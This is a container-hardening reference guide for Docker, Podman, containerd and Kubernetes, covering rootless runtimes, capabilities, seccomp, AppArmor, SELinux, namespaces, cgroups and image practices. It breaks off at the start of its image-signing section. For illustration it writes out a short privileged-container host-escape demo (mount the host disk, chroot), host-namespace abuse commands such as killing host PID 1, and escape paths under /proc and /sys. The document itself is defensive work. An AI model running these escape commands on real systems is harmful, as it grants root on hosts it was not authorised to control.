# Container Hardening

End-to-end hardening for Docker, Podman, containerd, and Kubernetes — rootless runtimes, capabilities, seccomp, AppArmor, SELinux, namespaces, cgroups, image signing, SBOM, supply-chain attestations, and runtime detection.

## Setup

The container ecosystem is fragmented across daemons, runtimes, and build tools. Knowing which component does what is the first step to hardening any of them. The OCI spec defines the contract between higher-level tools and the low-level runtime.

### Runtime Landscape

```bash
# Docker daemon (rootful, default)
dockerd --version                   # /usr/bin/dockerd, listens on /var/run/docker.sock
docker info | grep -i runtime       # active runtime (runc by default)

# Docker rootless mode
dockerd-rootless-setuptool.sh install   # set up systemd user unit
systemctl --user start docker
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock

# Podman (daemonless, rootless-first)
podman info --format '{{.Host.Security}}'
podman --runtime crun ps             # crun is faster + smaller than runc
podman system service --time=0 unix:///run/user/1000/podman/podman.sock

# containerd + nerdctl (Docker-compatible CLI)
ctr version                          # low-level containerd client
nerdctl version                      # Docker-CLI-compatible
nerdctl --namespace k8s.io ps        # see kubelet-managed containers

# BuildKit (modern image builder)
buildctl --addr unix:///run/buildkit/buildkitd.sock build ...
docker buildx version                # BuildKit-backed `docker build`
```

### OCI Runtimes

```bash
# runc — Go reference implementation, Linux-only
runc --version                       # runc version 1.1.x

# crun — C implementation, faster startup, smaller memory
crun --version                       # crun version 1.x

# youki — Rust implementation, security-focused
youki --version

# kata-containers — VM-isolated runtime (lightweight VM per container)
kata-runtime kata-check
kata-runtime version

# gVisor / runsc — userspace kernel for sandboxing
runsc --version
```

### OCI Spec

The Open Container Initiative publishes three specs that pin down the contracts between tools:

```bash
# OCI Runtime Spec — defines config.json layout for runtimes
# https://github.com/opencontainers/runtime-spec
oci-runtime-tool generate --output config.json
oci-runtime-tool validate --path bundle/

# OCI Image Spec — defines manifest, layers, index.json
# https://github.com/opencontainers/image-spec
skopeo inspect docker://docker.io/library/alpine:3.19
skopeo copy docker://alpine:3.19 oci:./alpine:3.19    # convert to OCI layout

# OCI Distribution Spec — registry HTTP API (push/pull/manifest)
# https://github.com/opencontainers/distribution-spec
curl -s https://registry-1.docker.io/v2/library/alpine/manifests/3.19 \
  -H 'Accept: application/vnd.oci.image.manifest.v1+json'
```

## Threat Model

A hardened container is one designed against an explicit attacker model. The four primary attacker goals frame every control on the page.

### Attacker Goals

```bash
# Goal 1: HOST ESCAPE
# Get from inside the container onto the host kernel as root
# Vector: privileged container + /dev mount + chroot pivot
# Vector: CAP_SYS_ADMIN + cgroupfs writable mount + release_agent abuse
# Vector: kernel exploit via syscall (Dirty Pipe, Dirty COW)

# Goal 2: LATERAL MOVEMENT
# Use compromised container to attack other containers / services
# Vector: --network=host gives access to all host services
# Vector: Docker socket mount (/var/run/docker.sock) = root on host
# Vector: shared volumes between tenant containers

# Goal 3: SUPPLY CHAIN COMPROMISE
# Insert malicious code at build/distribute time, run by victims
# Vector: typosquat base images (alpinee instead of alpine)
# Vector: maintainer credential theft → push backdoored tag
# Vector: build-time RCE via curl|bash in Dockerfile

# Goal 4: DATA EXFILTRATION
# Steal secrets, customer data, or model weights
# Vector: env var leak via /proc/1/environ
# Vector: volume mount escape
# Vector: cloud metadata service (169.254.169.254) from container
```

### Attack Vectors

```bash
# Privileged container
docker run --privileged ubuntu       # adds ALL caps, disables AppArmor/seccomp/SELinux
                                     # CAP_SYS_ADMIN alone has 30+ escape primitives

# Capability abuse
docker run --cap-add SYS_PTRACE ubuntu   # can ptrace host processes if --pid=host

# Namespace escape (host namespace abuse)
docker run --pid=host ubuntu kill -9 1   # kills PID 1 on the host
docker run --net=host nmap-image          # scans host network

# Syscall abuse
# Without seccomp filter: 350+ syscalls reachable
# With default filter: ~290 syscalls (no clone(CLONE_NEWUSER), keyctl, ptrace, etc.)

# Kernel exploit
# CVE-2022-0847 (Dirty Pipe): write to read-only files, including /etc/shadow
# CVE-2022-0185 (filesystem slab overflow): container escape via fsconfig
# Mitigations: seccomp filtering of unsafe syscalls, kernel patching, AppArmor

# Image tampering
# A registry MITM swaps your image manifest. Mitigation: cosign verify, content trust.

# Secret leakage
docker history myimage:latest         # exposes ARG / ENV values used in build
docker inspect $cid | jq '.[0].Config.Env'

# Supply chain
# Typosquat: requets, urlib3, eslint-prettier-plugin, colors.js (sabotage)
# Dependency confusion: internal pkg published publicly = priority over private feed
```

## Rootless Containers

Running the runtime as a non-root user removes the largest single source of privilege. Both Podman and Docker support rootless mode but have very different out-of-the-box postures.

### Podman Rootless

```bash
# Verify rootless setup
podman info --format '{{.Host.Security.Rootless}}'
# true

# UID/GID mapping subordination
cat /etc/subuid                      # alice:100000:65536
cat /etc/subgid                      # alice:100000:65536
# Means UID 0 inside container == UID 100000 on host

# Add subuid range for new user
sudo usermod --add-subuids 100000-165535 --add-subgids 100000-165535 alice

# Migrate after subuid change
podman system migrate

# View user namespace mapping inside running container
podman unshare cat /proc/self/uid_map
#         0     100000     65536

# Storage paths (per-user, no root needed)
ls ~/.local/share/containers/storage/    # rootless storage
podman info --format '{{.Store.GraphRoot}}'
```

### Docker Rootless Mode

```bash
# Install
curl -fsSL https://get.docker.com/rootless | sh

# Or manual
dockerd-rootless-setuptool.sh install --force
systemctl --user enable --now docker

# Set client target
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock
export PATH=/usr/bin:$PATH

# Verify
docker context use rootless
docker info | grep -i rootless       # rootless: true

# Network drivers
# slirp4netns — userspace TCP/IP, default on Linux, ~20% perf hit on small packets
# vpnkit — Docker Desktop's macOS/Windows option, slower
# rootlesskit with --net=lxc-user-nic — needs setuid helper, fastest
```

### fuse-overlayfs Limitations

```bash
# Rootless can't use kernel overlayfs (needs CAP_SYS_ADMIN to mount)
# Falls back to fuse-overlayfs, which is FUSE userspace
# Trade-offs:
#   - 10-30% slower I/O on small files
#   - Some xattr operations broken (older versions)
#   - SELinux labels limited

# Modern kernels (5.13+) support unprivileged overlayfs via user_namespaces
echo 1 | sudo tee /proc/sys/kernel/unprivileged_userns_clone
modprobe overlay && grep overlay /proc/filesystems

# Switch storage driver
~/.config/containers/storage.conf
# [storage]
# driver = "overlay"
# rootless_storage_path = "/var/lib/containers/storage"
```

### User Namespace Remapping (Rootful)

```bash
# /etc/docker/daemon.json — daemon-side userns-remap
{
  "userns-remap": "default"
}
# Creates dockremap user, maps to /etc/subuid range

# Per-container override impossible without --userns=host (escape!)
# Once enabled, all containers get remapped → may break legacy images that expect UID 0

# Disable per container (not recommended)
docker run --userns=host ubuntu
```

### Docker Desktop's Hidden Linux VM

```bash
# Docker Desktop on macOS/Windows ships a Linux VM (LinuxKit, HyperKit, WSL2, or Apple Virtualization)
# Containers run inside that VM as root → "rootless on host" but root in VM

# Inspect
docker run --rm --pid=host alpine ps -ef | head     # PID 1 is the VM init
docker run --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh   # shell into VM

# Enable Docker Desktop Enhanced Container Isolation (ECI)
# Settings → General → Use Enhanced Container Isolation
# Forces every container into rootless user namespace inside the VM
```

## UID/GID

Choosing the right user inside the image is the cheapest, biggest hardening win. By default Docker images run as root (UID 0), which means a single capability slip turns into root in the container.

### USER Directive

```dockerfile
# Worst — defaults to UID 0
FROM alpine:3.19
COPY app /app
CMD ["/app"]

# Better — non-root with named user (must exist in /etc/passwd)
FROM alpine:3.19
RUN addgroup -g 1000 app && adduser -D -u 1000 -G app app
COPY --chown=app:app app /app
USER app
CMD ["/app"]

# Best — numeric UID, scratch base, no /etc/passwd needed
FROM scratch
COPY --chown=65534:65534 app /app
USER 65534:65534                  # nobody:nogroup
ENTRYPOINT ["/app"]
```

### COPY/ADD --chown

```dockerfile
# Without --chown, files are owned by root inside the image
COPY config.yaml /etc/app/        # /etc/app/config.yaml owned by 0:0

# With --chown
COPY --chown=app:app config.yaml /etc/app/
COPY --chown=1000:1000 config.yaml /etc/app/

# --chmod also available in BuildKit
COPY --chown=app:app --chmod=0640 config.yaml /etc/app/
```

### "Run as Nobody" Pattern

```dockerfile
FROM golang:1.22 AS build
WORKDIR /src
COPY go.* ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -o /out/app .

FROM scratch
COPY --from=build /etc/passwd /etc/passwd      # required for User name resolution
COPY --from=build /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=build --chown=65534:65534 /out/app /app
USER 65534:65534
ENTRYPOINT ["/app"]
```

### FROM scratch UID

```bash
# scratch has no /etc/passwd, so USER name lookups fail
# But numeric USER works fine (kernel only cares about UID)
USER 65534:65534                # nobody on most distros

# Check effective UID at runtime
docker run --rm myimage id
# uid=65534(nobody) gid=65534(nogroup)
```

### Anti-Pattern: USER 0

```dockerfile
# DO NOT
FROM alpine
USER 0                          # explicit root, just as bad as default
RUN apk add --no-cache curl
CMD ["sh"]
```

## Capabilities

Linux capabilities split root's powers into ~40 fine-grained privileges. Default Docker drops 22 and grants 14 — but most apps need zero of them.

### Capability Catalog

| Capability | What it lets you do |
| --- | --- |
| `CAP_NET_BIND_SERVICE` | bind to privileged ports (<1024) |
| `CAP_NET_ADMIN` | configure network (iptables, route, interface up/down) |
| `CAP_NET_RAW` | open AF_PACKET / RAW sockets (ping, scapy) |
| `CAP_SYS_ADMIN` | "the new root" — mount, swapon, namespaces, etc. |
| `CAP_SYS_PTRACE` | ptrace any process (gdb, strace) |
| `CAP_SYS_MODULE` | insert/remove kernel modules — host escape |
| `CAP_SYS_RAWIO` | /dev/mem, ioperm — host escape |
| `CAP_SYS_BOOT` | reboot/kexec |
| `CAP_SYS_TIME` | settimeofday |
| `CAP_SYS_NICE` | set process priority / scheduling class |
| `CAP_SYS_RESOURCE` | override resource limits |
| `CAP_DAC_OVERRIDE` | bypass file permission checks |
| `CAP_DAC_READ_SEARCH` | bypass file read perms |
| `CAP_FOWNER` | bypass owner permission checks |
| `CAP_FSETID` | preserve setuid bit on file ops |
| `CAP_CHOWN` | chown any file |
| `CAP_KILL` | signal any process |
| `CAP_SETUID` | set arbitrary UID |
| `CAP_SETGID` | set arbitrary GID |
| `CAP_SETPCAP` | manipulate process capabilities |
| `CAP_AUDIT_WRITE` | write audit log |
| `CAP_AUDIT_CONTROL` | configure audit subsystem |
| `CAP_MAC_OVERRIDE` | override MAC (LSM) |
| `CAP_MAC_ADMIN` | configure MAC (LSM) |
| `CAP_LINUX_IMMUTABLE` | set chattr +i |
| `CAP_MKNOD` | mknod arbitrary device |
| `CAP_SETFCAP` | set file capabilities |
| `CAP_BLOCK_SUSPEND` | prevent system suspend |
| `CAP_WAKE_ALARM` | trigger wakeup alarms |
| `CAP_SYSLOG` | view kernel ring buffer (dmesg) |
| `CAP_BPF` | load BPF programs (5.8+) |
| `CAP_CHECKPOINT_RESTORE` | CRIU operations (5.9+) |
| `CAP_PERFMON` | perf_event_open (5.8+) |

### Docker Default Drops

```bash
# Docker keeps these 14 by default
# CAP_AUDIT_WRITE CAP_CHOWN CAP_DAC_OVERRIDE CAP_FOWNER CAP_FSETID
# CAP_KILL CAP_MKNOD CAP_NET_BIND_SERVICE CAP_NET_RAW CAP_SETFCAP
# CAP_SETGID CAP_SETPCAP CAP_SETUID CAP_SYS_CHROOT

# Inspect default profile
docker run --rm alpine grep CapEff /proc/self/status
# CapEff: 00000000a80425fb

# Decode bitmask
capsh --decode=00000000a80425fb
```

### Drop and Add

```bash
# Drop everything, add back only what you need
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx

# Drop ALL is the goal for ~90% of workloads
docker run --cap-drop ALL --read-only --user 65534 my-static-app

# Verify what's left
docker run --cap-drop ALL alpine grep Cap /proc/self/status
# CapInh: 0000000000000000
# CapPrm: 0000000000000000
# CapEff: 0000000000000000
# CapBnd: 0000000000000000
# CapAmb: 0000000000000000
```

### --privileged

```bash
# What --privileged actually does:
#   - cap_add ALL (every capability available)
#   - cgroup pass-through (full /sys/fs/cgroup write)
#   - /dev pass-through (host devices visible)
#   - AppArmor unconfined
#   - SELinux unconfined (with disable label)
#   - seccomp unconfined
#   - Removes most masks on /proc and /sys

# Equivalent expansion:
docker run --cap-add=ALL \
           --security-opt apparmor=unconfined \
           --security-opt seccomp=unconfined \
           --security-opt label=disable \
           -v /dev:/dev \
           --cgroupns=host \
           ubuntu

# Use ONLY for: docker-in-docker (still better: sysbox), GPU debug, low-level system tools
```

### USER + Capabilities Interaction

```bash
# Setting USER non-zero in Dockerfile drops all caps from inh/prm/eff sets
# but caps can re-enter via file-capabilities or ambient set

# Show file caps
getcap /usr/bin/ping
# /usr/bin/ping = cap_net_raw+ep

# Set file cap (in image build)
RUN setcap cap_net_bind_service+ep /app/server

# Ambient set (process-level, inherited by execve)
docker run --cap-add NET_BIND_SERVICE --user 65534 nginx
```

## Seccomp Profiles

Seccomp filters which syscalls a process can issue. Docker's runtime/default profile blocks ~50 dangerous syscalls and is enabled out of the box.

### What Seccomp Does

```bash
# Modes:
#   SECCOMP_MODE_STRICT    — only read, write, exit, sigreturn allowed (legacy)
#   SECCOMP_MODE_FILTER    — BPF program decides per-syscall (modern)

# Actions:
#   SCMP_ACT_ALLOW         — let it through
#   SCMP_ACT_ERRNO         — return errno (default: EPERM)
#   SCMP_ACT_KILL          — SIGKILL the thread
#   SCMP_ACT_KILL_PROCESS  — SIGKILL whole process
#   SCMP_ACT_TRAP          — SIGSYS
#   SCMP_ACT_LOG           — log + allow (auditing)
#   SCMP_ACT_NOTIFY        — userspace handler (5.5+)
```

### Docker Default Profile

```bash
# ~290 syscalls allowed out of ~350 total
# Blocked includes: keyctl, kcmp, mount, umount, pivot_root, ptrace,
# clone (with CLONE_NEWUSER), unshare (with CLONE_NEWUSER), etc.

# View source
curl -s https://raw.githubusercontent.com/moby/moby/master/profiles/seccomp/default.json | jq '.syscalls | length'
```

### Custom Profile

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_X32"],
  "syscalls": [
    {
      "names": ["read","write","close","fstat","lseek","mmap","munmap","brk","exit","exit_group","openat","newfstatat","arch_prctl","set_tid_address","set_robust_list","rseq","prlimit64","getrandom","execve","poll","futex"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### Apply Profile

```bash
# Use file
docker run --security-opt seccomp=./myprofile.json myimage

# Disable filter (only for debugging — equivalent to --privileged on syscalls)
docker run --security-opt seccomp=unconfined myimage

# Re-enable default (no-op, but explicit)
docker run --security-opt seccomp=runtime/default myimage

# Confirm filter is active
docker run --rm myimage grep Seccomp /proc/self/status
# Seccomp: 2          (0=disabled, 1=strict, 2=filter)
# Seccomp_filters: 1
```

### Seccomp + Namespace Permission Interaction

```bash
# Even with CAP_SYS_ADMIN, seccomp can block clone(CLONE_NEWUSER)
# Defaults block this combination — adding capabilities does NOT bypass seccomp

# To support nested unshare/clone you must:
#  1. Add capability: --cap-add SYS_ADMIN
#  2. AND relax seccomp: --security-opt seccomp=unconfined (or custom profile permitting clone with CLONE_NEWUSER)
```

### Generate Profile from Strace

```bash
# Capture syscalls used by app
strace -ff -o trace.out -e trace=all ./myapp
# Aggregate
strace-log-merge trace.out | awk '{print $1}' | sort -u > syscalls.txt

# Or use oci-seccomp-bpf-hook (Podman) to generate during run
podman run --annotation io.containers.trace-syscall=of:./myapp.json myimage
```

## AppArmor

AppArmor is a Linux Mandatory Access Control system that confines processes to a per-program profile. Ubuntu and Debian ship with AppArmor enabled.

### docker-default Profile

```bash
# Loaded automatically with Docker on AppArmor-enabled hosts
aa-status | grep docker-default
# /usr/sbin/dockerd (1234)
# docker-default (4321)

# View profile source
cat /etc/apparmor.d/docker-default
```

### Writing Custom Profiles

```c
// /etc/apparmor.d/my-app
#include <tunables/global>

profile my-app flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  network inet tcp,
  network inet udp,
  network inet icmp,

  deny network raw,
  deny network packet,

  /app/** r,
  /app/data/** rwk,
  /tmp/** rwk,

  deny /sys/firmware/** rwklx,
  deny /sys/kernel/security/** rwklx,
  deny /proc/sys/kernel/** wklx,

  capability net_bind_service,
  deny capability sys_admin,
  deny capability sys_module,
  deny capability sys_ptrace,

  pivot_root,
  ptrace (trace,read) peer=docker-default,
  signal (receive) peer=docker-default,
}
```

### Load and Apply

```bash
# Parse and load
sudo apparmor_parser -r -W /etc/apparmor.d/my-app

# Apply to container
docker run --security-opt apparmor=my-app myimage

# Disable (per container)
docker run --security-opt apparmor=unconfined myimage

# Audit instead of enforce (development)
sudo aa-complain /etc/apparmor.d/my-app

# Switch back to enforce
sudo aa-enforce /etc/apparmor.d/my-app
```

### Common Deny Patterns

```bash
# Block /sys/firmware (BIOS / EFI variables)
deny /sys/firmware/** rwklx,

# Block kernel-tunable writes
deny /proc/sys/** w,

# Block module loading
deny /sys/module/** w,

# Block raw block devices
deny /dev/sd* rwklx,
deny /dev/nvme* rwklx,

# Block ptrace from inside container
deny ptrace (read,trace) peer=**,
```

## SELinux

SELinux provides type-enforcement MAC. RHEL/Fedora/CentOS ship with it in enforcing mode and provide `container_t` for confined container processes.

### Container Types

```bash
# View current label
ps -eZ | grep myapp
# system_u:system_r:container_t:s0:c123,c456 1234 ? 00:00:00 myapp

# Process types:
#   container_t        — confined containers (default)
#   spc_t              — super-privileged containers (--privileged)
#   container_init_t   — init systems

# File types:
#   container_file_t   — files writable by container_t
#   container_share_t  — files shareable across categories
```

### MCS Labels

```bash
# Multi-Category Security: each container gets unique pair (e.g., s0:c123,c456)
# Two containers cannot read each other's files even if both are container_t

# Force a specific MCS pair
docker run --security-opt label=level:s0:c100,c200 myimage

# Disable SELinux for this container (equivalent of unconfined)
docker run --security-opt label=disable myimage

# Use alternate type
docker run --security-opt label=type:my_custom_t myimage
```

### Volume Mount Flags :z and :Z

```bash
# :z — relabel as shared (multiple containers can use)
docker run -v /data:/data:z myimage

# :Z — relabel as private (only this container)
docker run -v /data:/data:Z myimage

# WARNING: relabel touches xattrs on the host directory; do NOT use on /, /home, /usr
```

### audit2allow

```bash
# Find SELinux denials
sudo ausearch -m AVC -ts recent | grep myimage

# Generate policy from denials
sudo ausearch -m AVC -ts recent | audit2allow -M my-container-policy

# Install
sudo semodule -i my-container-policy.pp

# Uninstall
sudo semodule -r my-container-policy
```

## Read-Only Root

A read-only rootfs eliminates a huge class of attacks (downloaded malware, persistent backdoors, log poisoning) at almost zero cost.

### --read-only

```bash
# Make rootfs read-only
docker run --read-only myimage

# Add tmpfs for paths that need to be writable
docker run --read-only \
           --tmpfs /tmp:rw,nosuid,nodev,size=64m \
           --tmpfs /run:rw,nosuid,nodev,size=16m \
           --tmpfs /var/cache/nginx:rw,nosuid,nodev,size=16m \
           nginx:alpine

# tmpfs flags:
#   rw       — writable
#   nosuid   — ignore setuid bits
#   nodev    — ignore device files
#   noexec   — block exec from tmpfs (nice for /tmp)
#   size=Xm  — cap memory consumption
```

### Immutable Image Pattern

```dockerfile
FROM nginx:1.27-alpine
COPY nginx.conf /etc/nginx/nginx.conf
COPY --chown=101:101 ./public /usr/share/nginx/html
# Pre-create directories the entrypoint will need writable
RUN mkdir -p /var/cache/nginx /var/run \
 && chown -R 101:101 /var/cache/nginx /var/run
USER 101
ENTRYPOINT ["nginx", "-g", "daemon off;"]
```

```bash
docker run --read-only \
           --tmpfs /var/cache/nginx \
           --tmpfs /var/run \
           --user 101:101 \
           --cap-drop ALL --cap-add NET_BIND_SERVICE \
           --security-opt no-new-privileges \
           -p 8080:8080 \
           myorg/nginx:1.27.0-fips@sha256:abcd...
```

## Namespaces Deep

Linux namespaces are the foundation of containerization. Each namespace isolates one resource type. Sharing a namespace with the host (`--xxx=host`) negates the isolation.

### Namespace Types

```bash
# PID    — process IDs; PID 1 inside ≠ PID 1 outside
# NET    — network interfaces, ports, routes, iptables
# MNT    — filesystem mount points
# USER   — UID/GID mappings (rootless containers depend on this)
# IPC    — System V IPC, POSIX message queues
# UTS    — hostname, domainname
# CGROUP — cgroup root view
# TIME   — CLOCK_MONOTONIC / CLOCK_BOOTTIME offset (5.6+)
```

### Inspect Namespaces

```bash
# Container's namespaces
ls -la /proc/$(docker inspect -f '{{.State.Pid}}' $cid)/ns
# ipc -> ipc:[4026532567]
# mnt -> mnt:[4026532565]
# net -> net:[4026532569]
# pid -> pid:[4026532568]
# user -> user:[4026531837]    # SHARING host user ns
# uts -> uts:[4026532566]

# Host namespaces
ls -la /proc/1/ns

# Compare — if inode matches host, you're sharing
```

### --xxx=host Backdoors

```bash
# Network: see all host interfaces, bind to host ports, scan localhost
docker run --net=host alpine ip addr     # shows host's eth0

# PID: see all host processes, kill them, ptrace them
docker run --pid=host alpine ps -ef
docker run --pid=host --cap-add SYS_PTRACE alpine strace -p 1

# IPC: access host's POSIX message queues, shared memory
docker run --ipc=host myimage

# UTS: change host hostname
docker run --uts=host --cap-add SYS_ADMIN alpine hostname pwned

# User: NO user-namespace remapping (root in container = root on host)
docker run --userns=host myimage

# Cgroup: see real cgroup hierarchy
docker run --cgroupns=host myimage
```

### User Namespace Remap Config

```json
// /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```

```bash
# Or specify custom user
{ "userns-remap": "myuser:mygroup" }

# Restart daemon
sudo systemctl restart docker

# Verify
docker info | grep -i userns
# Security Options: ... userns

# Inspect ID mapping
cat /proc/$(docker inspect -f '{{.State.Pid}}' $cid)/uid_map
#         0     362144      65536
```

## cgroup-v2 Resource Control

cgroup-v2 unifies the resource controller hierarchy and is the default on modern distros (Fedora 31+, Ubuntu 21.10+, RHEL 9+). Limits prevent denial-of-service via resource exhaustion.

### Memory Limits

```bash
# Hard limit — OOM-kill at limit
docker run --memory=512m myimage

# Hard + swap
docker run --memory=512m --memory-swap=1g myimage   # 512m RAM + 512m swap
docker run --memory=512m --memory-swap=-1 myimage   # unlimited swap
docker run --memory=512m --memory-swap=512m myimage # disable swap

# Soft reservation (best-effort, kernel reclaim hint)
docker run --memory-reservation=256m --memory=512m myimage

# Swappiness (0 = avoid swap, 100 = aggressive)
docker run --memory=512m --memory-swappiness=10 myimage

# Disable OOM-killer (use sparingly — prefers other containers being killed)
docker run --oom-kill-disable myimage
```

### CPU Limits

```bash
# Fractional CPU count (cgroup v2: cpu.max)
docker run --cpus=1.5 myimage

# Relative weight (default 1024)
docker run --cpu-shares=512 myimage   # half priority

# Absolute quota (cfs)
docker run --cpu-period=100000 --cpu-quota=50000 myimage   # 50% of one CPU

# Pin to specific cores
docker run --cpuset-cpus=0,2 myimage   # only cores 0 and 2
docker run --cpuset-cpus=0-3 myimage   # cores 0,1,2,3

# Pin to NUMA nodes
docker run --cpuset-mems=0 myimage
```

### PID Limits

```bash
# Limit process count (mitigates fork bombs)
docker run --pids-limit=100 myimage

# Verify
docker exec $cid cat /sys/fs/cgroup/pids.max
```

### I/O Limits

```bash
# Block IO weight (10-1000, default 500)
docker run --blkio-weight=300 myimage

# Per-device weight
docker run --blkio-weight-device=/dev/sda:200 myimage

# Read/write throughput cap
docker run --device-read-bps=/dev/sda:1mb myimage
docker run --device-write-bps=/dev/sda:512kb myimage

# IOPS cap
docker run --device-read-iops=/dev/sda:100 myimage
docker run --device-write-iops=/dev/sda:50 myimage
```

### cgroup-v2 Tree

```bash
# Detect version
stat -fc %T /sys/fs/cgroup
# cgroup2fs    -> v2
# tmpfs        -> v1

# Show container limits
docker exec $cid cat /sys/fs/cgroup/memory.max
# 536870912

docker exec $cid cat /sys/fs/cgroup/cpu.max
# 150000 100000        # quota period

docker exec $cid cat /sys/fs/cgroup/pids.max
# 100
```

## no-new-privileges

Sets the prctl bit `PR_SET_NO_NEW_PRIVS`, blocking any future call to `execve()` from gaining privileges via setuid binaries or file capabilities.

### --security-opt no-new-privileges

```bash
# Apply
docker run --security-opt no-new-privileges myimage

# Combined with USER non-root, makes setuid root binaries inert
docker run --security-opt no-new-privileges --user 65534 alpine sudo whoami
# sudo: effective uid is not 0, is /usr/bin/sudo on a file system with the 'nosuid' option set or an NFS file system without root privileges?
```

### Underlying Syscall

```c
// What the runtime does
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
```

### What Breaks

```bash
# Setuid binaries no longer escalate
# (sudo, su, mount, ping with cap_net_raw via setuid, passwd)
docker run --security-opt no-new-privileges --user 1000 alpine sh -c "ping -c1 1.1.1.1"
# ping: socket: Permission denied

# Fix — give the cap directly via --cap-add (binary won't need setuid)
docker run --security-opt no-new-privileges --cap-add NET_RAW --user 1000 alpine ping -c1 1.1.1.1
```

### Recommended Baseline

```bash
docker run --read-only \
           --tmpfs /tmp \
           --user 65534:65534 \
           --cap-drop ALL \
           --security-opt no-new-privileges \
           --security-opt seccomp=runtime/default \
           myimage
```

## Privileged vs Unprivileged

The `--privileged` flag is the single biggest one-line vulnerability you can give a container. Almost no production workload needs it.

### What --privileged Actually Does

```bash
# Equivalent to all of these together:
--cap-add ALL                          # all capabilities granted
--security-opt apparmor=unconfined     # AppArmor off
--security-opt seccomp=unconfined      # seccomp filter off
--security-opt label=disable           # SELinux off
--cgroupns=host                        # share host cgroup ns
-v /dev:/dev                           # pass through ALL host devices
--device-cgroup-rule="a *:* rwm"       # allow all device access
# Removes default mask on /proc/* and /sys/*
```

### Demo Escape

```bash
# Inside privileged container — mount host root
docker run --privileged -it ubuntu bash
# In container:
mkdir /host
mount /dev/sda1 /host       # mounts the host root filesystem
chroot /host bash
# Now you are root on the host
```

### Rootful vs Rootless

```bash
# Rootful — daemon runs as root, container processes mapped 1:1 to host UIDs
#   * --privileged → root on host
#   * Mistake = total compromise

# Rootless — daemon and runtime run as ordinary user
#   * --privileged inside rootless still escalates only within user's UID range
#   * Capability set still bounded by user's caps
#   * Safer default for dev / multi-tenant
```

### Alternatives to --privileged

```bash
# DinD without --privileged → use sysbox runtime
docker run --runtime=sysbox-runc -it nestybox/ubuntu-bionic-systemd

# GPU access without --privileged
docker run --gpus all nvidia/cuda:12.0-base nvidia-smi

# Raw network → only --cap-add NET_RAW + NET_ADMIN
docker run --cap-add NET_RAW --cap-add NET_ADMIN nicolaka/netshoot

# /dev access → only specific devices
docker run --device=/dev/snd:/dev/snd audio-app
```

## /proc and /sys

Default Docker masks dangerous /proc and /sys paths so containers can't read or write kernel internals. `--privileged` removes the masks.

### Default Mask List

```bash
# Read-only paths (covered by tmpfs/null mounts):
#   /proc/asound /proc/acpi /proc/kcore /proc/keys
#   /proc/latency_stats /proc/timer_list /proc/timer_stats
#   /proc/sched_debug /proc/scsi /sys/firmware

# Read-only mountpoints:
#   /proc/bus /proc/fs /proc/irq /proc/sys /proc/sysrq-trigger

# These paths are bind-mounted to /dev/null inside the container
docker run --rm alpine cat /proc/kcore     # cat: read error: No such device or address
```

### --security-opt systempaths=unconfined

```bash
# Drop all the default masks
docker run --security-opt systempaths=unconfined myimage

# Equivalent of --privileged for /proc and /sys access
# Use cases: kernel debugging, perf profiling, observability sidecars
```

### --security-opt readonly-rootfs

```bash
# Confusingly named — this is an alias for --read-only
docker run --security-opt readonly-rootfs=true myimage
# Same as --read-only myimage
```

### Specific Paths to Watch

```bash
# /proc/sys/kernel/core_pattern — if writable, can pipe core dumps to attacker binary
# /proc/sys/kernel/modprobe     — can be hijacked if kernel module loading triggered
# /proc/sys/kernel/yama/ptrace_scope — disables ptrace restrictions
# /sys/kernel/uevent_helper     — kernel calls this binary on hot-plug events
# /sys/fs/cgroup/release_agent  — old cgroup-v1 escape via release_agent

# All of these are masked by default profile and exposed by --privileged
```

## Image Hardening

The container image is your supply-chain artifact. Less software = less attack surface. Pin everything that can drift.

### Multi-Stage Builds

```dockerfile
# Build stage — has compiler, npm, full toolchain
FROM golang:1.22 AS build
WORKDIR /src
COPY go.* ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags='-s -w' -o /out/app .

# Final stage — only the binary
FROM gcr.io/distroless/static:nonroot
COPY --from=build /out/app /app
USER nonroot:nonroot
ENTRYPOINT ["/app"]
```

### Minimal Bases

```bash
# scratch         — 0 bytes, only your binary; no shell, no libc, no resolver
# distroless      — minimal C lib + CA bundle + tzdata; ~20 MB
# alpine          — musl libc, busybox, apk; ~5 MB
# ubuntu          — full glibc, apt; ~70 MB
# debian-slim     — full glibc, apt; ~30 MB
# chiseled-ubuntu — Canonical's distroless; specific package slices

# Compare
docker images | grep -E "alpine|distroless|scratch"
```

### Tag Pinning Anti-Pattern

```dockerfile
# DO NOT — :latest drifts
FROM alpine:latest

# Bad — major version only
FROM alpine:3

# OK — full version
FROM alpine:3.19.1

# BEST — pin by digest (immutable)
FROM alpine:3.19.1@sha256:c5b1261d6d3e43071626931fc004f10149baeae8a90a0b7d6d11e9af2c7a40e2
```

### CIS Docker Benchmark — Image Section

```bash
# 4.1  Create a user for the container
# 4.2  Use trusted base images
# 4.3  Do not install unnecessary packages
# 4.4  Scan and rebuild the image to apply security patches
# 4.5  Enable Content Trust for Docker
# 4.6  Add HEALTHCHECK
# 4.7  Do not use update instructions alone (apt-get update without install)
# 4.8  Remove setuid and setgid permissions in images
# 4.9  Use COPY instead of ADD
# 4.10 Do not store secrets in Dockerfiles
# 4.11 Install verified packages only
```

```bash
# Find setuid/setgid in image
docker run --rm myimage find / -perm /6000 -type f 2>/dev/null

# Strip them in build
RUN find / -perm /6000 -type f -exec chmod a-s {} \; -o -true
```

### HEALTHCHECK

```dockerfile
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
  CMD curl -f http://localhost:8080/health || exit 1
```

## Image Signing

Without signing, registry MITM and account compromise let attackers swap your image. Cosign + Sigstore makes signing keyless and free.

### cosign — Keyless Sigstore

```bash
# Install
curl -O -L https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
